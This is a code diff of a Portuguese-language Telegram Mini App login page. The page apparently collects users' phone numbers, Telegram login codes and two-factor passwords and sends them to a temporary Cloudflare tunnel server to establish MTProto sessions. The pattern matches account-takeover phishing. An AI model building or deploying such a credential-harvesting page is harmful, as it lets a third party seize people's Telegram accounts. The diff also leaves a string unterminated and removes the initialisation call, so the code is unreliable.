@@ -30,9 +30,17 @@
 
         <!-- Passo 1: Verificação Inicial (initData) -->
         <div id="step-init" class="step active">
-            <div class="spinner"></div>
-            <p style="text-align: center;">Analisando sua sessão...</p>
-        </div>
+        
+    <p style="text-align: center;">
+        Entre com sua conta do Telegram para continuar.
+    </p>
+
+    <button id="btn-login" type="button">
+        Entrar com Telegram
+    </button>
+
+    <div id="status-login" class="status"></div>
+</div>
 
         <!-- Passo 2: Login MTProto -->
         <div id="step-login" class="step">
@@ -53,12 +61,38 @@
     </div>
 
     <script>
+    const loginButton = document.getElementById('btn-login');
+const loginStatus = document.getElementById('status-login');
+
+loginButton.addEventListener('click', async () => {
+    loginButton.disabled = true;
+
+    loginStatus.className = 'status info';
+    loginStatus.textContent = 'Verificando conexão...';
+
+    try {
+        if (!window.Telegram?.WebApp?.initData) {
+            throw new Error(
+                'Abra esta página pelo botão da Mini App no Telegram.'
+            );
+        }
+
+        loginStatus.textContent =
+            'Telegram detectado. Identidade disponível para verificação.';
+
+    } catch (error) {
+        loginStatus.className = 'status error';
+        loginStatus.textContent = error.message;
+    } finally {
+        loginButton.disabled = false;
+    }
+});
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
-        
+
         const API_BASE = 'https://california-bidding-towers-sides.trycloudflare.com⁠;
-        
+
         let currentPhone = '';
         let authStarted = false;
 
@@ -78,7 +112,7 @@ if (!res.ok) {
         data.detail || `Erro HTTP ${res.status}`
     );
 }
-                
+
                 if (data.status === 'authenticated') {
                     if (data.has_mtproto_session) {
                         // Já tem sessão MTProto
@@ -116,28 +150,28 @@ if (!res.ok) {
             const passInput = document.getElementById('password');
             const btn = document.getElementById('btn-auth');
             const status = document.getElementById('status-auth');
-            
+
             if (!phone) {
                 status.className = 'status error';
                 status.textContent = 'Insira seu número de telefone.';
                 return;
             }
-            
+
             currentPhone = phone;
-            
+
             if (!authStarted) {
                 // Fase 1: Iniciar Auth
                 btn.disabled = true;
                 status.className = 'status info';
                 status.textContent = 'Enviando código... Verifique seu Telegram.';
-                
+
                 try {
                     await fetch(`${API_BASE}/api/auth/start`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ phone })
                     });
-                    
+
                     authStarted = true;
                     codeInput.disabled = false;
                     codeInput.placeholder = 'Código recebido no Telegram';
@@ -152,17 +186,17 @@ if (!res.ok) {
                 // Fase 2: Verificar Código
                 const code = codeInput.value;
                 const password = passInput.value;
-                
+
                 if (!code) {
                     status.className = 'status error';
                     status.textContent = 'Insira o código.';
                     return;
                 }
-                
+
                 btn.disabled = true;
                 status.className = 'status info';
                 status.textContent = 'Verificando...';
-                
+
                 try {
                     const res = await fetch(`${API_BASE}/api/auth/verify`, {
                         method: 'POST',
@@ -170,7 +204,7 @@ if (!res.ok) {
                         body: JSON.stringify({ phone, code, password: password || null })
                     });
                     const data = await res.json();
-                    
+
                     if (data.detail === '2FA_REQUIRED') {
                         passInput.style.display = 'block';
                         status.className = 'status info';
@@ -178,7 +212,7 @@ if (!res.ok) {
                         btn.disabled = false;
                         return;
                     }
-                    
+
                     if (data.status === 'authenticated') {
                         showStep('step-success');
                         document.getElementById('user-info').innerHTML = `
@@ -196,8 +230,7 @@ if (!res.ok) {
                 }
             }
         });
-
-        init();
+        
     </script>
 </body>
 </html>
